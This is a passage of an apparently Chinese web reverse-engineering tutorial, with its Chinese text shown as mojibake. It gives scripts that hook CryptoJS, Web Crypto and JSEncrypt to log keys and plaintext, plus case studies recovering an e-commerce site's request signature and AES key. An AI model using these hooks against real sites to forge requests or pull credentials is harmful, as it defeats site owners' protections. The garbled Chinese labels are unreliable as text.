<span class="w">        </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">AES</span><span class="p">.</span><span class="nx">decrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">ciphertext</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="nx">cfg</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ”“ [CryptoJS.AES.decrypt]&#39;</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   å¯†æ–‡:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">ciphertext</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   å¯†é’¥:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>

<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">originalDecrypt</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>

<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   æ˜æ–‡:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Utf8</span><span class="p">));</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">trace</span><span class="p">();</span>

<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="w">        </span><span class="p">};</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Hook HMAC</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">HmacSHA256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalHmac</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">HmacSHA256</span><span class="p">;</span>
<span class="w">        </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">HmacSHA256</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">message</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ” [CryptoJS.HmacSHA256]&#39;</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   æ¶ˆæ¯:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">message</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   å¯†é’¥:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>

<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">originalHmac</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>

<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   HMAC:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>

<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="w">        </span><span class="p">};</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;âœ… CryptoJS Hook å®Œæˆ&#39;</span><span class="p">);</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <h3 id="hook-web-crypto-api">Hook Web Crypto API</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nb">window</span><span class="p">.</span><span class="nx">crypto</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="nb">window</span><span class="p">.</span><span class="nx">crypto</span><span class="p">.</span><span class="nx">subtle</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;âš ï¸  Web Crypto API ä¸å¯ç”¨&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ£ å¼€å§‹ Hook Web Crypto API&#39;</span><span class="p">);</span>

<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">subtle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">crypto</span><span class="p">.</span><span class="nx">subtle</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Hook encrypt</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalEncrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">subtle</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">;</span>
<span class="w">    </span><span class="nx">subtle</span><span class="p">.</span><span class="nx">encrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">algorithm</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ” [crypto.subtle.encrypt]&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   ç®—æ³•:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">algorithm</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   å¯†é’¥:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   æ•°æ®é•¿åº¦:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">byteLength</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;bytes&#39;</span><span class="p">);</span>

<span class="w">        </span><span class="c1">// è½¬æ¢ä¸ºå¯è¯»æ ¼å¼</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">dataArray</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   æ•°æ®ï¼ˆå‰100å­—èŠ‚ï¼‰:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nb">Array</span><span class="p">.</span><span class="kr">from</span><span class="p">(</span><span class="nx">dataArray</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">100</span><span class="p">)));</span>

<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">originalEncrypt</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>

<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   å¯†æ–‡é•¿åº¦:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">.</span><span class="nx">byteLength</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;bytes&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">trace</span><span class="p">();</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="c1">// Hook decrypt</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalDecrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">subtle</span><span class="p">.</span><span class="nx">decrypt</span><span class="p">;</span>
<span class="w">    </span><span class="nx">subtle</span><span class="p">.</span><span class="nx">decrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">algorithm</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ”“ [crypto.subtle.decrypt]&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   ç®—æ³•:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">algorithm</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   å¯†é’¥:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   å¯†æ–‡é•¿åº¦:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">byteLength</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;bytes&#39;</span><span class="p">);</span>

<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">originalDecrypt</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>

<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">plaintext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">result</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   æ˜æ–‡:&#39;</span><span class="p">,</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">TextDecoder</span><span class="p">().</span><span class="nx">decode</span><span class="p">(</span><span class="nx">plaintext</span><span class="p">));</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="c1">// Hook digest</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalDigest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">subtle</span><span class="p">.</span><span class="nx">digest</span><span class="p">;</span>
<span class="w">    </span><span class="nx">subtle</span><span class="p">.</span><span class="nx">digest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">algorithm</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ” [crypto.subtle.digest]&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   ç®—æ³•:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">algorithm</span><span class="p">);</span>

<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">dataArray</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">TextDecoder</span><span class="p">().</span><span class="nx">decode</span><span class="p">(</span><span class="nx">dataArray</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   è¾“å…¥:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">text</span><span class="p">);</span>

<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">originalDigest</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>

<span class="w">        </span><span class="c1">// è½¬æ¢ä¸º Hex</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">hashArray</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Array</span><span class="p">.</span><span class="kr">from</span><span class="p">(</span><span class="ow">new</span><span class="w"> </span><span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">result</span><span class="p">));</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">hashHex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">hashArray</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">b</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">b</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mf">16</span><span class="p">).</span><span class="nx">padStart</span><span class="p">(</span><span class="mf">2</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;0&#39;</span><span class="p">)).</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   å“ˆå¸Œ:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">hashHex</span><span class="p">);</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="c1">// Hook sign</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalSign</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">subtle</span><span class="p">.</span><span class="nx">sign</span><span class="p">;</span>
<span class="w">    </span><span class="nx">subtle</span><span class="p">.</span><span class="nx">sign</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">algorithm</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ” [crypto.subtle.sign]&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   ç®—æ³•:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">algorithm</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   å¯†é’¥:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">);</span>

<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">originalSign</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>

<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">sigArray</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Array</span><span class="p">.</span><span class="kr">from</span><span class="p">(</span><span class="ow">new</span><span class="w"> </span><span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">result</span><span class="p">));</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">sigHex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">sigArray</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">b</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">b</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mf">16</span><span class="p">).</span><span class="nx">padStart</span><span class="p">(</span><span class="mf">2</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;0&#39;</span><span class="p">)).</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   ç­¾å:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">sigHex</span><span class="p">);</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;âœ… Web Crypto API Hook å®Œæˆ&#39;</span><span class="p">);</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <h3 id="hook-jsencrypt-rsa">Hook JSEncrypt (RSA)</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nb">window</span><span class="p">.</span><span class="nx">JSEncrypt</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;âš ï¸  JSEncrypt æœªåŠ è½½&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ£ å¼€å§‹ Hook JSEncrypt&#39;</span><span class="p">);</span>

<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalEncrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">JSEncrypt</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">;</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalDecrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">JSEncrypt</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">decrypt</span><span class="p">;</span>

<span class="w">    </span><span class="nx">JSEncrypt</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">encrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">text</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ” [JSEncrypt.encrypt]&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   æ˜æ–‡:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">text</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   å…¬é’¥:&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">getPublicKey</span><span class="p">());</span>

<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">originalEncrypt</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>

<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   å¯†æ–‡:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">trace</span><span class="p">();</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="nx">JSEncrypt</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">decrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">text</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ”“ [JSEncrypt.decrypt]&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   å¯†æ–‡:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">text</span><span class="p">);</span>

<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">originalDecrypt</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>

<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   æ˜æ–‡:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">);</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;âœ… JSEncrypt Hook å®Œæˆ&#39;</span><span class="p">);</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å®æˆ˜æ¡ˆä¾‹">å®æˆ˜æ¡ˆä¾‹</h2>

      <h3 id="æ¡ˆä¾‹1-è¯†åˆ«æŸç”µå•†ç½‘ç«™çš„ç­¾åç®—æ³•">æ¡ˆä¾‹1: è¯†åˆ«æŸç”µå•†ç½‘ç«™çš„ç­¾åç®—æ³•</h3>

      <p><strong>åœºæ™¯</strong>: æŸç”µå•†ç½‘ç«™çš„ API è¯·æ±‚åŒ…å«ç­¾åå‚æ•° <code>sign</code></p>

      <p><strong>æ­¥éª¤1: æ£€æµ‹åŠ å¯†åº“</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">detector</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">CryptoDetector</span><span class="p">();</span>
<span class="nx">detector</span><span class="p">.</span><span class="nx">scanGlobalObjects</span><span class="p">();</span>
<span class="c1">// è¾“å‡º: âœ… å‘ç°åŠ å¯†åº“: CryptoJS</span>
</code></pre>
      </div>

      <p><strong>æ­¥éª¤2: Hook CryptoJS</strong></p>

      <p>å‘ç°è°ƒç”¨äº† <code>CryptoJS.MD5</code>ï¼š</p>

      <pre><code>ğŸ” [CryptoJS.MD5]
   è¾“å…¥: timestamp=1638360000&amp;user_id=123456&amp;secret=abc123
   è¾“å‡º: 5d41402abc4b2a76b9719d911017c592
</code></pre>

      <p><strong>æ­¥éª¤3: åˆ†æç­¾åé€»è¾‘</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// è¿˜åŸç­¾åå‡½æ•°</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">generateSign</span><span class="p">(</span><span class="nx">timestamp</span><span class="p">,</span><span class="w"> </span><span class="nx">userId</span><span class="p">,</span><span class="w"> </span><span class="nx">secret</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`timestamp=</span><span class="si">${</span><span class="nx">timestamp</span><span class="si">}</span><span class="sb">&amp;user_id=</span><span class="si">${</span><span class="nx">userId</span><span class="si">}</span><span class="sb">&amp;secret=</span><span class="si">${</span><span class="nx">secret</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">MD5</span><span class="p">(</span><span class="nx">str</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="æ¡ˆä¾‹2-ç ´è§£-aes-åŠ å¯†çš„è¯·æ±‚å‚æ•°">æ¡ˆä¾‹2: ç ´è§£ AES åŠ å¯†çš„è¯·æ±‚å‚æ•°</h3>

      <p><strong>åœºæ™¯</strong>: è¯·æ±‚ä½“æ˜¯åŠ å¯†çš„ Base64 å­—ç¬¦ä¸²</p>

      <p><strong>æ­¥éª¤1: Hook CryptoJS.AES</strong></p>

      <pre><code>ğŸ” [CryptoJS.AES.encrypt]
   æ˜æ–‡: {"user":"admin","password":"123456"}
   å¯†é’¥: my-secret-key-16
   é…ç½®: {mode: CBC, iv: ...}
   å¯†æ–‡: U2FsdGVkX1+... (Base64)
</code></pre>

      <p><strong>æ­¥éª¤2: æå–åŠ å¯†å‚æ•°</strong></p>

      <ul>
        <li>ç®—æ³•: AES-CBC</li>
        <li>å¯†é’¥: <code>my-secret-key-16</code></li>
        <li>IV: (ä»é…ç½®ä¸­æå–)</li>
        <li>æ¨¡å¼: CBC</li>
      </ul>

      <p><strong>æ­¥éª¤3: Python å¤ç°</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Cipher</span><span class="w"> </span><span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Util.Padding</span><span class="w"> </span><span class="kn">import</span> <span class="n">pad</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>

<span class="k">def</span><span class="w"> </span><span class="nf">aes_encrypt</span><span class="p">(</span><span class="n">plaintext</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">):</span>
    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">plaintext</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>

<span class="c1"># ä½¿ç”¨</span>
<span class="n">key</span> <span class="o">=</span> <span class="s1">&#39;my-secret-key-16&#39;</span>
<span class="n">iv</span> <span class="o">=</span> <span class="s1">&#39;...&#39;</span>  <span class="c1"># ä» Hook ç»“æœä¸­è·å–</span>
